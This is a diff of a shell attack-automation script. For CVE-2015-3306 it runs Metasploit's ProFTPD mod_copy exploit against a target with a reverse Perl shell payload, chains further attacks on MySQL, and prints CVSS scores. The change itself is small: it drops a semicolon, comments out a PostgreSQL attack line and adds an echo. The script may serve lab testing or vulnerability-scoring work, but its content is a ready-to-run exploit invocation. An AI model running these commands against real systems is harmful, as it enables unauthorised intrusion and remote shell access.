@@ -6,12 +6,13 @@ TARGET=$2
 
 if [ $ATTACK == "CVE-2015-3306" ]
 then
-	msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set rhost $TARGET; set sitepath /var/www/html; set exploit cmd/unix/reverse_perl; run; sessions -i 1 -s command_shell.sh; exit -y; " 
+	msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set rhost $TARGET; set sitepath /var/www/html; set exploit cmd/unix/reverse_perl; run; sessions -i 1 -s command_shell.sh; exit -y" 
 	# in command shell run command background and then enter y
 	SERVER=$(cat results.txt | cut -d'/' -f 5 | cut -d'.' -f 2)
 	rm results.txt
 	./attack-script.sh $TARGET mysql $SERVER
-	./attack-script.sh $TARGET postgresql $SERVER 
+	echo $SERVER  
+	#./attack-script.sh $TARGET postgresql $SERVER
 	echo "baseScore_V2: 10"
 	echo "severity_V2: HIGH"
 	echo "exploitabilityScore_V2: 10"
